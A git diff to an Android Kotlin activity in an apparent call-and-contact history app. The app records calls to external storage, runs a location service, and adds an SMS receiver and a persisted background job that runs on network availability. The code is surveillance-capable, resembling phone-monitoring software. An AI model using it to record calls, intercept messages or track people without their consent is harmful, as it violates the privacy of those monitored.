@@ -6,16 +6,22 @@ import an.xuan.tong.historycontact.api.ApiService
 import an.xuan.tong.historycontact.api.Repository
 import an.xuan.tong.historycontact.api.model.InformationResponse
 import an.xuan.tong.historycontact.call.CallRecord
+import an.xuan.tong.historycontact.connectivity.NetworkSchedulerService
 import an.xuan.tong.historycontact.location.LocationService
 import an.xuan.tong.historycontact.realm.RealmUtils
 import an.xuan.tong.historycontact.service.TokenService
+import an.xuan.tong.historycontact.smsradar.Receiver.SMSreceiver
 import an.xuan.tong.historycontact.smsradar.Sms
 import an.xuan.tong.historycontact.smsradar.SmsListener
 import an.xuan.tong.historycontact.smsradar.SmsRadar
 import android.Manifest
 import android.app.Activity
+import android.app.job.JobInfo
+import android.app.job.JobScheduler
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.location.LocationManager
 import android.media.MediaRecorder
@@ -45,10 +51,13 @@ import java.util.*
 
 class TokenActivity : Activity() {
     lateinit var callRecord: CallRecord
+    private val receiver = SMSreceiver()
     public override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_hello_token)
         initView()
+        val filter = IntentFilter();
+
         permissionApp()
         if (!checkGSP()) {
             showSettingsAlert()
@@ -119,7 +128,7 @@ class TokenActivity : Activity() {
                 .setRecordDirName("Historycontact")
                 .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                 .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-                .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                 .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                 .setShowSeed(true)
                 .build()
@@ -189,10 +198,12 @@ class TokenActivity : Activity() {
             }
         })
 
+
     }
 
     @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
     fun handlerGetInformationSccess(listData: InformationResponse) {
+        scheduleJob();
         //call service
         startCallService()
         //location service
@@ -260,6 +271,20 @@ class TokenActivity : Activity() {
         // Display the alert dialog on app interface
         dialog.show()
 
+    }
 
+    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+    private fun scheduleJob() {
+        Log.e("antx", "scheduleJob()")
+        var myJob = JobInfo.Builder(0, ComponentName(this, NetworkSchedulerService::class.java))
+                .setRequiresCharging(true)
+                .setMinimumLatency(1000)
+                .setOverrideDeadline(2000)
+                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
+                .setPersisted(true)
+                .build();
+
+        var jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
+        jobScheduler.schedule(myJob);
     }
 }
